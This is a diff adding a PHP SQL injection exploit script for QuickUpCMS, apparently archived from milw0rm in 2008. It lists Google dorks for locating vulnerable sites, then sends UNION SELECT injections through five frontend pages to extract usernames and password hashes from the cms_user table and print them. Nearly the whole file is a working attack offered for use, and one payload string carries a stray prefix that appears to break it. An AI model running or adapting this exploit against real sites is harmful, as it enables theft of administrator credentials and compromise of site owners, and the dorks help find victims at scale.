@@ -1,0 +1,67 @@
+<?php
+ini_set("max_execution_time",0);
+print_r('
+###############################################################
+#
+#           QuickUpCMS - SQL Injection Exploit     
+#                                                             
+#      Vulnerability discovered by: Lidloses_Auge             
+#      Exploit coded by:            Lidloses_Auge
+#      Greetz to:                   -=Player=- , Suicide, g4ms3, enco,
+#                                   GPM, Free-Hack
+#      Date:                        10.05.2008
+#
+###############################################################
+#                                                             
+#      Dork1:  inurl:/frontend/news.php?nr=
+#      Dork2:  inurl:/frontend/events2.php
+#      Dork3:  inurl:/frontend/events3.php?id=
+#      Dork4:  inurl:/frontend/fotos2.php?ser=
+#      Dork5:  inurl:/frontend/videos2.php?id=
+#      Usage: php '.$argv[0].' [Target] [Method] [Userid]
+#      Methods:
+#         1: news.php
+#         2: events2.php
+#         3: events3.php
+#         4: fotos2.php
+#         5: videos2.php
+#      Example for "http://www.site.com/frontend/news.php?nr=2"
+#      => php '.$argv[0].' http://www.site.com/frontend/ 1 1
+#                                                             
+###############################################################
+');
+
+if ($argc == 4) {
+
+$url = $argv[1];
+$methodnr = $argv[2];
+$userid = $argv[3];
+
+if ($methodnr==1) {
+   $method = 'news.php?nr=null\'union+select+1,2,3,4,5,6,7,8,9,10,concat(0x3a3a3a3a,user,0x3a3a313a3a,pass,0x3a3a323a3a),12/**/from+cms_user+where+id='.$userid.'/*';
+} elseif ($methodnr==2) {
+   $method = 'events2.php?d=null&m=null&y=null\'union+select+1,2,3,4,5,6,7,concat(0x3a3a3a3a,user,0x3a3a313a3a,pass,0x3a3a323a3a),9/**/from+cms_user+where+id='.$userid.'/*';
+} elseif ($methodnr==3) {
+   $method = 'events3.php?id=null\'union+select+1,2,3,4,5,6,7,concat(0x3a3a3a3a,user,0x3a3a313a3a,pass,0x3a3a323a3a),9/**/from+cms_user+where+id='.$userid.'/*';
+} elseif ($methodnr==4) {
+   $method = 'fotos2.php?ser=null\'union+select+1,2,concat(0x3a3a3a3a,user,0x3a3a313a3a,pass,0x3a3a323a3a),4,5/**/from+cms_user+where+id='.$userid.'/*';
+} elseif ($methodnr==5) {
+   $method = 'method5: videos2.php?id=null\'union+select+1,2,3,4,5,concat(0x3a3a3a3a,user,0x3a3a313a3a,pass,0x3a3a323a3a),7/**/from+cms_user+where+id='.$userid.'/*';
+}
+
+$source = @file_get_contents($url.$method);
+
+echo "\n";
+if (strpos($source,'::::')!=0) {
+   echo 'User: '.substr($source,strpos($source,'::::')+4,strpos($source,'::1::')-strpos($source,'::::')-4)."\n";
+   echo 'Hash: '.substr($source,strpos($source,'::1::')+5,strpos($source,'::2::')-strpos($source,'::1::')-5)."\n";
+} else {
+   echo 'Exploit failed!'."\n";
+}
+   
+} else {
+echo "\n".'Not enough arguments!'."\n";
+}
+?>
+
+# milw0rm.com [2008-05-11]
